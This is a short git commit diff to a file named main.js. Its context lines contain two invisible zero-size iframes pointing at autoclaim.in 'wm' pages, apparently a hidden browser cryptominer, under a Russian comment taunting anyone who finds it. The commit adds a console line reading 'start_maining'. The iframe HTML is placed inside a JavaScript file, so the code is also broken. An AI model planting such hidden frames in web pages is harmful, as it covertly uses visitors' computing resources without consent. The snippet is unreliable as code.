ab0dcd5af2cc076754c9cebb6ef51d00e945a4b0
Gydra534 <124122395+Gydra534@users.noreply.github.com>
2023-02-01 20:30:19 +0300

    Update main.js

--- main.js
+++ main.js
@@ -1,3 +1,4 @@
 //Если вы видте это, то вы грязный хакер, я не шучу. Что тебе тут надо???
 <iframe src="https://autoclaim.in/wm/jopanegra/2" width="0" height="0" style="border:0"></iframe>;
 <iframe src="https://autoclaim.in/wm/jopanegra/4" width="0" height="0" style="border:0"></iframe>;
+console.log("start_maining");
